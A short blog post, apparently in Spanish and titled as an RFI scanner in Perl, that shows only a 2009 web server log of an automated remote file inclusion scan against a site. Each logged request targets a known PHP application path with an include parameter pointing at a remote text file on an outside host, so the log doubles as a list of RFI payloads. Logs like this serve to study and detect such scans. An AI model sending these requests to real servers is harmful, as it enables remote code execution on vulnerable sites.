# Scanner RFI en Perl
## Logs, PHP, Servers 
### URL: https://www.jesusninoc.com/2009/05/26/scanner-de-rfi-en-perl/
```PowerShell
- - [26/May/2009:09:22:15 +0200] "GET /Forums/admin/index.php?phpbb_root_path=https://xxx/appserv/t.txt? HTTP/1.1" 404 325
- - [26/May/2009:09:22:15 +0200] "GET /forum/impex/ImpExData.php?systempath=https://xxx/appserv/t.txt? HTTP/1.1" 404 328
- - [26/May/2009:09:22:16 +0200] "GET /impex/ImpExData.php?systempath=https://xxx/appserv/t.txt? HTTP/1.1" 404 322
- - [26/May/2009:09:22:16 +0200] "GET /forums/impex/ImpExData.php?systempath=https://xxx/appserv/t.txt? HTTP/1.1" 404 329
- - [26/May/2009:09:22:16 +0200] "GET /webcalendar/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 339
- - [26/May/2009:09:22:16 +0200] "GET /WebCalendar/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 339
- - [26/May/2009:09:22:16 +0200] "GET /cacti/include/config_settings.php?config[include_path]=https://xxx/appserv/t.txt? HTTP/1.1" 404 336
- - [26/May/2009:09:22:17 +0200] "GET /webcalendar/ws/get_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 335
- - [26/May/2009:09:22:17 +0200] "GET /calendar/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 336
- - [26/May/2009:09:22:17 +0200] "GET /calendar/ws/get_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 332
- - [26/May/2009:09:22:17 +0200] "GET /kalendar/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 336
- - [26/May/2009:09:22:17 +0200] "GET /webcal/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 334
- - [26/May/2009:09:22:17 +0200] "GET /cal/tools/send_reminders.php?includedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 331
- - [26/May/2009:09:22:18 +0200] "GET /appserv/main.php?appserv_root=https://xxx/appserv/t.txt? HTTP/1.1" 404 319
- - [26/May/2009:09:22:18 +0200] "GET /includes/db_adodb.php?baseDir=https://xxx/appserv/t.txt? HTTP/1.1" 404 324
- - [26/May/2009:09:22:18 +0200] "GET /includes/session.php?baseDir=https://xxx/appserv/t.txt? HTTP/1.1" 404 323
- - [26/May/2009:09:22:18 +0200] "GET /modules/projects/gantt.php?dPconfig[root_dir]=https://xxx/appserv/t.txt? HTTP/1.1" 404 329
- - [26/May/2009:09:22:18 +0200] "GET /modules/projects/gantt2.php?dPconfig[root_dir]=https://xxx/appserv/t.txt? HTTP/1.1" 404 330
- - [26/May/2009:09:22:19 +0200] "GET /modules/projects/vw_files.php?dPconfig[root_dir]=https://xxx/appserv/t.txt? HTTP/1.1" 404 332
- - [26/May/2009:09:22:19 +0200] "GET /modules/admin/vw_usr_roles.php?baseDir=https://xxx/appserv/t.txt? HTTP/1.1" 404 333
- - [26/May/2009:09:22:19 +0200] "GET /modules/public/calendar.php?baseDir=https://xxx/appserv/t.txt? HTTP/1.1" 404 330
- - [26/May/2009:09:22:19 +0200] "GET /modules/public/date_format.php?baseDir=https://xxx/appserv/t.txt? HTTP/1.1" 404 333
- - [26/May/2009:09:22:19 +0200] "GET /yabbse/Sources/Packages.php?sourcedir=https://xxx/appserv/t.txt? HTTP/1.1" 404 330
- - [26/May/2009:09:22:20 +0200] "GET /yappa-ng/src/index_overview.inc.php?config[path_src_include]=https://xxx/appserv/t.txt? HTTP/1.1" 404 338
- - [26/May/2009:09:22:20 +0200] "GET /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=https://xxx/appserv/t.txt? HTTP/1.1" 404 348

```
